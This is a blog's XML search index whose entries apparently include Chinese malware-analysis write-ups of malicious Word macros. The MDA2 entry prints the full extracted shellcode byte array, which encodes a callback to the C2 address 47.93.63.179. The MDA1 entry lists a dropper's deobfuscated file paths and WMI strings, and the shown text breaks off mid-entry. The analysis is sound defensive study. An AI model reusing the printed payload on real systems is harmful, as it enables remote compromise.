<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2023秋招_计算机网络准备</title>
      <link href="/2023/09/06/2023%E7%A7%8B%E6%8B%9B_%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/"/>
      <url>/2023/09/06/2023%E7%A7%8B%E6%8B%9B_%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="757910f03f94d6145f4b5d3b520a3cf4e04672793c038467ea7f3a0903930903"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 金九银十 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 秋招 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023秋招_WEB漏洞原理</title>
      <link href="/2023/09/06/2023%E7%A7%8B%E6%8B%9B_WEB%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
      <url>/2023/09/06/2023%E7%A7%8B%E6%8B%9B_WEB%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="26dfcbe3614a65e6ee463388675ffa5afcf7b3821ff18217f64900cc85ca1b60"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 金九银十 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 秋招 </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MAS系列-MDA2</title>
      <link href="/2023/03/20/MDA2/"/>
      <url>/2023/03/20/MDA2/</url>
      
        <content type="html"><![CDATA[<p>分析样本: 070281b8c1a72893182928c21bf7241a0ad8c95879969d5f58e28d08f1a73b55</p><p>‍</p><h1 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h1><img src="/2023/03/20/MDA2/image-20230320161750-8ynd6c5.png" class="" title="image">​<img src="/2023/03/20/MDA2/image-20230320161914-smi8g2v.png" class="" title="image">​<img src="/2023/03/20/MDA2/image-20230320163841-m5hk6zj.png" class="" title="image">​<img src="/2023/03/20/MDA2/image-20230320163845-06yl6hi.png" class="" title="image">​<p>我们搜集到了以下信息</p><ul><li>他是一个  **Microsoft Word 2007+**，所以它是一个zip container</li><li>它与特定的IP地址和端口通信：<strong>47.93.63.179:7498</strong></li><li>它的家族是<strong>Metasploit</strong></li><li>它可能有<strong>代码注入</strong></li><li>这个样本可能会会<strong>把文件dumps到Windows目录</strong></li><li><strong>有嵌入的宏</strong></li></ul><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>使用zipdump.py分析文件</p><img src="/2023/03/20/MDA2/image-20230320165505-v3ul3b9.png" class="" title="image">​<p>5(word/vbaProject.bin) 比较可疑，继续分析5</p><img src="/2023/03/20/MDA2/image-20230320165715-cy4dkxf.png" class="" title="image">​<p>对象3是个宏，也是OLE文件中最大的对象。宏是以压缩的形式存储的，因此在读取其内容之前必须先解压缩</p><img src="/2023/03/20/MDA2/image-20230320170050-5jnmhwt.png" class="" title="image">​<img src="/2023/03/20/MDA2/image-20230320170154-7sok3l9.png" class="" title="image">​<p>直接SHIFT打开文件，ALT + F11查看宏</p><img src="/2023/03/20/MDA2/image-20230320163310-x1v4meo.png" class="" title="image">​<p>分析</p><img src="/2023/03/20/MDA2/image-20230320171749-ugke0i2.png" class="" title="image">​<ul><li>这个代码像是Cobalt Strike / Metasploit 生成的代码</li><li>调用了CreateRemoteProcess(), VirtualAllocEx()和WriteProcessMemory() 证实了代码注入行为</li><li>有一个长度很大的数组，可能是ShellCode或者一个PE文件</li></ul><p>编写一个简单的Python代码将ShellCode提取出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">myArray = [-<span class="number">4</span>, -<span class="number">24</span>, -<span class="number">119</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">96</span>, -<span class="number">119</span>, -<span class="number">27</span>, <span class="number">49</span>, -<span class="number">46</span>, <span class="number">100</span>, -<span class="number">117</span>, <span class="number">82</span>, <span class="number">48</span>, -<span class="number">117</span>, <span class="number">82</span>, <span class="number">12</span>, -<span class="number">117</span>, <span class="number">82</span>, <span class="number">20</span>, -<span class="number">117</span>, <span class="number">114</span>, <span class="number">40</span>, <span class="number">15</span>, -<span class="number">73</span>, <span class="number">74</span>, <span class="number">38</span>, <span class="number">49</span>, -<span class="number">1</span>, <span class="number">49</span>, -<span class="number">64</span>, -<span class="number">84</span>, <span class="number">60</span>, <span class="number">97</span>, <span class="number">124</span>, <span class="number">2</span>, <span class="number">44</span>, <span class="number">32</span>, -<span class="number">63</span>, -<span class="number">49</span>,</span><br><span class="line">           <span class="number">13</span>, <span class="number">1</span>, -<span class="number">57</span>, -<span class="number">30</span>, -<span class="number">16</span>, <span class="number">82</span>, <span class="number">87</span>, -<span class="number">117</span>, <span class="number">82</span>, <span class="number">16</span>, -<span class="number">117</span>, <span class="number">66</span>, <span class="number">60</span>, <span class="number">1</span>, -<span class="number">48</span>, -<span class="number">117</span>, <span class="number">64</span>, <span class="number">120</span>, -<span class="number">123</span>, -</span><br><span class="line">           <span class="number">64</span>, <span class="number">116</span>, <span class="number">74</span>, <span class="number">1</span>, -<span class="number">48</span>, <span class="number">80</span>, -<span class="number">117</span>, <span class="number">72</span>, <span class="number">24</span>, -</span><br><span class="line">           <span class="number">117</span>, <span class="number">88</span>, <span class="number">32</span>, <span class="number">1</span>, -<span class="number">45</span>, -<span class="number">29</span>, <span class="number">60</span>, <span class="number">73</span>, -<span class="number">117</span>, <span class="number">52</span>, -<span class="number">117</span>, <span class="number">1</span>,</span><br><span class="line">           -<span class="number">42</span>, <span class="number">49</span>, -<span class="number">1</span>, <span class="number">49</span>, -<span class="number">64</span>, -<span class="number">84</span>, -<span class="number">63</span>, -<span class="number">49</span>, <span class="number">13</span>, <span class="number">1</span>, -<span class="number">57</span>, <span class="number">56</span>, -<span class="number">32</span>, <span class="number">117</span>, -<span class="number">12</span>, <span class="number">3</span>, <span class="number">125</span>, -<span class="number">8</span>, <span class="number">59</span>, <span class="number">125</span>, <span class="number">36</span>, <span class="number">117</span>, -</span><br><span class="line">           <span class="number">30</span>, <span class="number">88</span>, -<span class="number">117</span>, <span class="number">88</span>, <span class="number">36</span>, <span class="number">1</span>, -<span class="number">45</span>, <span class="number">102</span>, -<span class="number">117</span>, <span class="number">12</span>, <span class="number">75</span>, -<span class="number">117</span>, <span class="number">88</span>, <span class="number">28</span>, <span class="number">1</span>, -<span class="number">45</span>, -<span class="number">117</span>, <span class="number">4</span>,</span><br><span class="line">           -<span class="number">117</span>, <span class="number">1</span>, -<span class="number">48</span>, -<span class="number">119</span>, <span class="number">68</span>, <span class="number">36</span>, <span class="number">36</span>, <span class="number">91</span>, <span class="number">91</span>, <span class="number">97</span>, <span class="number">89</span>, <span class="number">90</span>, <span class="number">81</span>, -<span class="number">1</span>, -<span class="number">32</span>, <span class="number">88</span>, <span class="number">95</span>, <span class="number">90</span>, -<span class="number">117</span>, <span class="number">18</span>, -</span><br><span class="line">           <span class="number">21</span>, -<span class="number">122</span>, <span class="number">93</span>, <span class="number">104</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">0</span>, <span class="number">104</span>, <span class="number">119</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">84</span>, <span class="number">104</span>, <span class="number">76</span>, <span class="number">119</span>, <span class="number">38</span>, <span class="number">7</span>, -<span class="number">1</span>,</span><br><span class="line">           -<span class="number">43</span>, <span class="number">49</span>, -<span class="number">1</span>, <span class="number">87</span>, <span class="number">87</span>, <span class="number">87</span>, <span class="number">87</span>, <span class="number">87</span>, <span class="number">104</span>, <span class="number">58</span>, <span class="number">86</span>, <span class="number">121</span>, -<span class="number">89</span>, -<span class="number">1</span>, -<span class="number">43</span>, -<span class="number">23</span>, -<span class="number">124</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">49</span>, -</span><br><span class="line">           <span class="number">55</span>, <span class="number">81</span>, <span class="number">81</span>, <span class="number">106</span>, <span class="number">3</span>, <span class="number">81</span>, <span class="number">81</span>, <span class="number">104</span>, <span class="number">74</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">83</span>, <span class="number">80</span>, <span class="number">104</span>, <span class="number">87</span>, -<span class="number">119</span>, -<span class="number">97</span>,</span><br><span class="line">           -<span class="number">58</span>, -<span class="number">1</span>, -<span class="number">43</span>, -<span class="number">21</span>, <span class="number">112</span>, <span class="number">91</span>, <span class="number">49</span>, -<span class="number">46</span>, <span class="number">82</span>, <span class="number">104</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">64</span>, -<span class="number">124</span>, <span class="number">82</span>, <span class="number">82</span>, <span class="number">82</span>, <span class="number">83</span>, <span class="number">82</span>, <span class="number">80</span>, <span class="number">104</span>, -</span><br><span class="line">           <span class="number">21</span>, <span class="number">85</span>, <span class="number">46</span>, <span class="number">59</span>, -<span class="number">1</span>, -<span class="number">43</span>, -<span class="number">119</span>, -<span class="number">58</span>, -<span class="number">125</span>, -</span><br><span class="line">           <span class="number">61</span>, <span class="number">80</span>, <span class="number">49</span>, -<span class="number">1</span>, <span class="number">87</span>, <span class="number">87</span>, <span class="number">106</span>, -<span class="number">1</span>, <span class="number">83</span>, <span class="number">86</span>,</span><br><span class="line">           <span class="number">104</span>, <span class="number">45</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">123</span>, -<span class="number">1</span>, -<span class="number">43</span>, -<span class="number">123</span>, -<span class="number">64</span>, <span class="number">15</span>, -<span class="number">124</span>, -<span class="number">61</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">49</span>, -<span class="number">1</span>, -<span class="number">123</span>, -<span class="number">10</span>, <span class="number">116</span>, <span class="number">4</span>, -</span><br><span class="line">           <span class="number">119</span>, -<span class="number">7</span>, -<span class="number">21</span>, <span class="number">9</span>, <span class="number">104</span>, -<span class="number">86</span>, -<span class="number">59</span>, -<span class="number">30</span>, <span class="number">93</span>, -</span><br><span class="line">           <span class="number">1</span>, -<span class="number">43</span>, -<span class="number">119</span>, -<span class="number">63</span>, <span class="number">104</span>, <span class="number">69</span>, <span class="number">33</span>, <span class="number">94</span>, <span class="number">49</span>, -<span class="number">1</span>,</span><br><span class="line">           -<span class="number">43</span>, <span class="number">49</span>, -<span class="number">1</span>, <span class="number">87</span>, <span class="number">106</span>, <span class="number">7</span>, <span class="number">81</span>, <span class="number">86</span>, <span class="number">80</span>, <span class="number">104</span>, -<span class="number">73</span>, <span class="number">87</span>, -<span class="number">32</span>, <span class="number">11</span>, -<span class="number">1</span>, -<span class="number">43</span>, -<span class="number">65</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">57</span>, -</span><br><span class="line">           <span class="number">57</span>, <span class="number">116</span>, -<span class="number">73</span>, <span class="number">49</span>, -<span class="number">1</span>, -<span class="number">23</span>, -<span class="number">111</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">23</span>, -<span class="number">55</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">24</span>, -<span class="number">117</span>, -<span class="number">1</span>,</span><br><span class="line">           -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">47</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">79</span>, <span class="number">56</span>, <span class="number">0</span>, -<span class="number">21</span>, <span class="number">16</span>, <span class="number">49</span>, -<span class="number">71</span>, -<span class="number">117</span>, <span class="number">51</span>, <span class="number">127</span>, -<span class="number">117</span>, -<span class="number">33</span>, <span class="number">54</span>, <span class="number">31</span>, -<span class="number">69</span>, -</span><br><span class="line">           <span class="number">19</span>, <span class="number">48</span>, <span class="number">21</span>, -<span class="number">37</span>, -<span class="number">56</span>, -<span class="number">107</span>, -<span class="number">59</span>, <span class="number">23</span>, -<span class="number">88</span>, -<span class="number">63</span>, <span class="number">0</span>, -</span><br><span class="line">           <span class="number">104</span>, -<span class="number">116</span>, -<span class="number">51</span>, -<span class="number">104</span>, <span class="number">65</span>, -<span class="number">48</span>, -<span class="number">118</span>, -<span class="number">80</span>, <span class="number">62</span>,</span><br><span class="line">           <span class="number">123</span>, -<span class="number">103</span>, -<span class="number">51</span>, -<span class="number">124</span>, -<span class="number">11</span>, -<span class="number">27</span>, <span class="number">50</span>, <span class="number">17</span>, -<span class="number">77</span>, -<span class="number">115</span>, <span class="number">98</span>, <span class="number">29</span>, <span class="number">106</span>, -<span class="number">71</span>, -<span class="number">108</span>, <span class="number">35</span>, <span class="number">99</span>, -<span class="number">94</span>, <span class="number">70</span>, <span class="number">89</span>, -</span><br><span class="line">           <span class="number">41</span>, <span class="number">14</span>, -<span class="number">9</span>, <span class="number">114</span>, -<span class="number">126</span>, -<span class="number">101</span>, -<span class="number">95</span>, -<span class="number">16</span>, -</span><br><span class="line">           <span class="number">75</span>, <span class="number">44</span>, <span class="number">28</span>, <span class="number">59</span>, -<span class="number">70</span>, <span class="number">123</span>, -<span class="number">27</span>, <span class="number">55</span>, <span class="number">63</span>, -<span class="number">86</span>, <span class="number">8</span>, <span class="number">66</span>,</span><br><span class="line">           -<span class="number">3</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">45</span>, <span class="number">65</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">58</span>, <span class="number">32</span>, <span class="number">77</span>, <span class="number">111</span>, <span class="number">122</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">52</span>, <span class="number">46</span>, <span class="number">48</span>, <span class="number">32</span>, <span class="number">40</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">112</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">59</span>, <span class="number">32</span>, <span class="number">77</span>,</span><br><span class="line">           <span class="number">83</span>, <span class="number">73</span>, <span class="number">69</span>, <span class="number">32</span>, <span class="number">55</span>, <span class="number">46</span>, <span class="number">48</span>, <span class="number">59</span>, <span class="number">32</span>, <span class="number">87</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">115</span>, <span class="number">32</span>, <span class="number">78</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">48</span>, <span class="number">41</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">73</span>, <span class="number">5</span>, <span class="number">8</span>, -</span><br><span class="line">           <span class="number">70</span>, <span class="number">26</span>, -<span class="number">68</span>, <span class="number">95</span>, <span class="number">117</span>, -<span class="number">58</span>, -<span class="number">111</span>, -<span class="number">107</span>, <span class="number">21</span>,</span><br><span class="line">           <span class="number">47</span>, -<span class="number">40</span>, -<span class="number">43</span>, <span class="number">89</span>, <span class="number">118</span>, <span class="number">112</span>, -<span class="number">18</span>, <span class="number">17</span>, <span class="number">116</span>, -<span class="number">104</span>, <span class="number">95</span>, <span class="number">44</span>, -<span class="number">45</span>, -<span class="number">100</span>, -<span class="number">125</span>, <span class="number">106</span>, <span class="number">75</span>, -<span class="number">7</span>, -<span class="number">57</span>, <span class="number">92</span>, -</span><br><span class="line">           <span class="number">90</span>, -<span class="number">44</span>, -<span class="number">128</span>, -<span class="number">53</span>, <span class="number">22</span>, -<span class="number">20</span>, <span class="number">101</span>, <span class="number">119</span>, -<span class="number">65</span>, -</span><br><span class="line">           <span class="number">69</span>, -<span class="number">87</span>, <span class="number">29</span>, <span class="number">90</span>, <span class="number">118</span>, <span class="number">66</span>, <span class="number">24</span>, <span class="number">20</span>, -<span class="number">60</span>, <span class="number">86</span>, -<span class="number">86</span>,</span><br><span class="line">           -<span class="number">69</span>, <span class="number">89</span>, <span class="number">56</span>, <span class="number">15</span>, <span class="number">74</span>, <span class="number">78</span>, <span class="number">113</span>, <span class="number">44</span>, <span class="number">73</span>, -<span class="number">16</span>, -<span class="number">52</span>, -<span class="number">119</span>, <span class="number">13</span>, <span class="number">5</span>, -<span class="number">24</span>, -<span class="number">71</span>, -<span class="number">64</span>, <span class="number">127</span>, -<span class="number">79</span>, -<span class="number">61</span>, -<span class="number">126</span>, -</span><br><span class="line">           <span class="number">53</span>, -<span class="number">105</span>, -<span class="number">7</span>, <span class="number">76</span>, -<span class="number">108</span>, -<span class="number">60</span>, -<span class="number">75</span>, <span class="number">41</span>, -<span class="number">101</span>, -<span class="number">61</span>, -</span><br><span class="line">           <span class="number">14</span>, -<span class="number">10</span>, <span class="number">65</span>, <span class="number">120</span>, -<span class="number">70</span>, -<span class="number">117</span>, -<span class="number">120</span>, <span class="number">55</span>, -<span class="number">110</span>,</span><br><span class="line">           <span class="number">51</span>, <span class="number">94</span>, -<span class="number">73</span>, -<span class="number">52</span>, <span class="number">82</span>, -<span class="number">66</span>, <span class="number">10</span>, -<span class="number">103</span>, -<span class="number">105</span>, -<span class="number">92</span>, <span class="number">32</span>, -<span class="number">44</span>, <span class="number">8</span>, -<span class="number">88</span>, <span class="number">126</span>, <span class="number">14</span>, <span class="number">75</span>, -<span class="number">29</span>, -<span class="number">72</span>, -</span><br><span class="line">           <span class="number">19</span>, -<span class="number">87</span>, <span class="number">5</span>, -<span class="number">61</span>, <span class="number">7</span>, -<span class="number">109</span>, -<span class="number">41</span>, <span class="number">23</span>, -<span class="number">91</span>, -</span><br><span class="line">           <span class="number">116</span>, <span class="number">41</span>, <span class="number">24</span>, -<span class="number">84</span>, -<span class="number">47</span>, <span class="number">6</span>, -<span class="number">99</span>, <span class="number">110</span>, -<span class="number">117</span>, <span class="number">78</span>, -<span class="number">47</span>, <span class="number">1</span>,</span><br><span class="line">           -<span class="number">112</span>, -<span class="number">55</span>, <span class="number">29</span>, <span class="number">110</span>, <span class="number">32</span>, <span class="number">30</span>, -<span class="number">83</span>, <span class="number">107</span>, -<span class="number">101</span>, <span class="number">65</span>, <span class="number">111</span>, -<span class="number">73</span>, <span class="number">113</span>, -<span class="number">100</span>, <span class="number">64</span>, -<span class="number">117</span>, -<span class="number">103</span>, -<span class="number">117</span>, -</span><br><span class="line">           <span class="number">30</span>, <span class="number">73</span>, <span class="number">102</span>, <span class="number">66</span>, <span class="number">76</span>, -<span class="number">3</span>, -<span class="number">51</span>, <span class="number">56</span>, -<span class="number">66</span>, -<span class="number">33</span>, -<span class="number">73</span>, -</span><br><span class="line">           <span class="number">2</span>, -<span class="number">5</span>, -<span class="number">116</span>, <span class="number">17</span>, <span class="number">71</span>, <span class="number">75</span>, <span class="number">39</span>, <span class="number">61</span>, <span class="number">69</span>, -<span class="number">44</span>, <span class="number">48</span>,</span><br><span class="line">           <span class="number">5</span>, -<span class="number">28</span>, <span class="number">108</span>, -<span class="number">42</span>, -<span class="number">58</span>, -<span class="number">116</span>, -<span class="number">5</span>, <span class="number">112</span>, <span class="number">42</span>, -<span class="number">91</span>, -<span class="number">69</span>, <span class="number">30</span>, -<span class="number">90</span>, <span class="number">46</span>, -<span class="number">20</span>, -<span class="number">50</span>, -<span class="number">18</span>, -<span class="number">37</span>, -<span class="number">54</span>, -<span class="number">125</span>, -</span><br><span class="line">           <span class="number">27</span>, <span class="number">90</span>, <span class="number">30</span>, <span class="number">106</span>, <span class="number">62</span>, -<span class="number">73</span>, -<span class="number">88</span>, <span class="number">102</span>, -<span class="number">113</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">96</span>, -</span><br><span class="line">           <span class="number">101</span>, <span class="number">73</span>, -<span class="number">9</span>, -<span class="number">15</span>, -<span class="number">8</span>, <span class="number">20</span>, -<span class="number">125</span>, -<span class="number">63</span>,</span><br><span class="line">           -<span class="number">7</span>, <span class="number">15</span>, -<span class="number">124</span>, <span class="number">49</span>, <span class="number">6</span>, -<span class="number">61</span>, -<span class="number">87</span>, <span class="number">24</span>, -<span class="number">84</span>, <span class="number">72</span>, -<span class="number">113</span>, <span class="number">38</span>, <span class="number">32</span>, <span class="number">0</span>, -<span class="number">30</span>, <span class="number">5</span>, <span class="number">124</span>, <span class="number">52</span>, <span class="number">18</span>, -</span><br><span class="line">           <span class="number">99</span>, <span class="number">46</span>, <span class="number">11</span>, <span class="number">56</span>, -<span class="number">9</span>, -<span class="number">14</span>, <span class="number">0</span>, <span class="number">104</span>, -<span class="number">16</span>, -<span class="number">75</span>, -</span><br><span class="line">           <span class="number">94</span>, <span class="number">86</span>, -<span class="number">1</span>, -<span class="number">43</span>, <span class="number">106</span>, <span class="number">64</span>, <span class="number">104</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">           <span class="number">104</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">0</span>, <span class="number">87</span>, <span class="number">104</span>, <span class="number">88</span>, -<span class="number">92</span>, <span class="number">83</span>, -<span class="number">27</span>, -<span class="number">1</span>, -<span class="number">43</span>, -<span class="number">109</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, -</span><br><span class="line">           <span class="number">39</span>, <span class="number">81</span>, <span class="number">83</span>, -<span class="number">119</span>, -<span class="number">25</span>, <span class="number">87</span>, <span class="number">104</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">83</span>, <span class="number">86</span>, <span class="number">104</span>, <span class="number">18</span>, -<span class="number">106</span>, -<span class="number">119</span>, -<span class="number">30</span>, -<span class="number">1</span>, -<span class="number">43</span>,</span><br><span class="line">           -<span class="number">123</span>, -<span class="number">64</span>, <span class="number">116</span>, -<span class="number">58</span>, -<span class="number">117</span>, <span class="number">7</span>, <span class="number">1</span>, -<span class="number">61</span>, -<span class="number">123</span>, -<span class="number">64</span>, <span class="number">117</span>, -<span class="number">27</span>, <span class="number">88</span>, -<span class="number">61</span>, -<span class="number">24</span>, -<span class="number">87</span>, -<span class="number">3</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">52</span>, <span class="number">55</span>, <span class="number">46</span>, <span class="number">57</span>, <span class="number">51</span>, <span class="number">46</span>, <span class="number">54</span>, <span class="number">51</span>, <span class="number">46</span>, <span class="number">49</span>, <span class="number">55</span>, <span class="number">57</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">52</span>, <span class="number">86</span>, <span class="number">120</span>]</span><br><span class="line">c = [x &amp; <span class="number">0XFF</span> <span class="keyword">for</span> x <span class="keyword">in</span> myArray]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(c))</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;shellcode.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> myArray:</span><br><span class="line">    write_byte = struct.pack(<span class="string">&quot;&lt;b&quot;</span>, i)</span><br><span class="line">    f.write(write_byte)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>010Editor打开分析，显然不是PE文件，应该是一个ShellCode</p><img src="/2023/03/20/MDA2/image-20230320174208-bwo1tox.png" class="" title="image">​<img src="/2023/03/20/MDA2/image-20230320173923-0zk6fhh.png" class="" title="image"><p>‍</p><p>可以用scdbg.exe去仿真执行</p><img src="/2023/03/20/MDA2/image-20230320175226-b7adm29.png" class="" title="image">​<p>至此，分析结束</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MalwareAnalysis </tag>
            
            <tag> 恶意文档 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MAS系列-MDA1</title>
      <link href="/2023/03/17/MDA1/"/>
      <url>/2023/03/17/MDA1/</url>
      
        <content type="html"><![CDATA[<p>分析的样本： 59ed41388826fed419cc3b18d28707491a4fa51309935c4fa016e53c6f2f94bc</p><h1 id="下载样本和收集信息"><a href="#下载样本和收集信息" class="headerlink" title="下载样本和收集信息"></a>下载样本和收集信息</h1><img src="/2023/03/17/MDA1/image-20230317101755-vdiydl0.png" class="" title="image">​<h1 id="分析恶意文档"><a href="#分析恶意文档" class="headerlink" title="分析恶意文档"></a>分析恶意文档</h1><p>通过malwoverview的输出，可以看到恶意文档可能会释放出exe，然后提升权限，HOOK，进程注入等操作。</p><p>使用olevba和oleid来收集更多的信息</p><img src="/2023/03/17/MDA1/image-20230317103803-vcqvuqd.png" class="" title="image">​<img src="/2023/03/17/MDA1/image-20230317104216-lgh9u5g.png" class="" title="image">​<p>从这2个图可以分析出一些事实</p><ul><li>当MS Word被执行的时候，一些代码被执行了</li><li>一个文件可能被写入</li><li>maldoc可能打开了一个文件</li><li>VBA宏负责整个活动</li></ul><p>使用OLEDUMP分析</p><img src="/2023/03/17/MDA1/image-20230317110800-mwia6sz.png" class="" title="image">​<p>发现，有3个宏，16,17,18</p><p>在第11处有大量的数据，猜测是一个VBA resources，可能是加密的资源</p><img src="/2023/03/17/MDA1/image-20230317121944-oc4yjqe.png" class="" title="image">​<p>从上面的输出中可以观察到一些细节</p><ul><li>很显然，代码被混淆了</li><li>split函数返回一个一维数组，它处理UserForm1中的内容，这些内容被分为了4部分，UserForm1内容似乎用!字符分割</li><li>UserForm2正在进行MoveFile操作</li><li>Winmgmt服务是在LocalSystem帐户下的svchost进程内操作的WMI服务，用于执行UserForm2.TextBox5给定的操作。</li><li>UserForm2.Text 6用于创建对ActiveX提供的对象的引用。</li><li>UserForm2.Text 7用于保存内容到二进制文件中</li></ul><img src="/2023/03/17/MDA1/image-20230317161742-ux4l2z6.png" class="" title="image">​<p>所以</p><ul><li><strong>UserForm2.Text1:</strong> C:\Users\Public\Pictures\winword.con</li><li><strong>UserForm2.Text2:</strong> C:\Users\Public\Pictures\winword.exe</li><li><strong>UserForm2.Text3: ​</strong>Scripting.FileSystemObject</li><li><strong>UserForm2.Text4: ​</strong>winmgmts:{impersonationLevel=impersonate}!&quot; &amp; strComputer &amp; “\root\cimv2}</li><li><strong>UserForm2.Text5: ​</strong>Win32_ProcessStartup</li><li><strong>UserForm2.Text6: ​</strong>winmgmts:root\cimv2:Win32_Process</li><li><strong>UserForm2.Text7: ​</strong>ADODB.Stream</li></ul><img src="/2023/03/17/MDA1/image-20230317162302-zcrpury.png" class="" 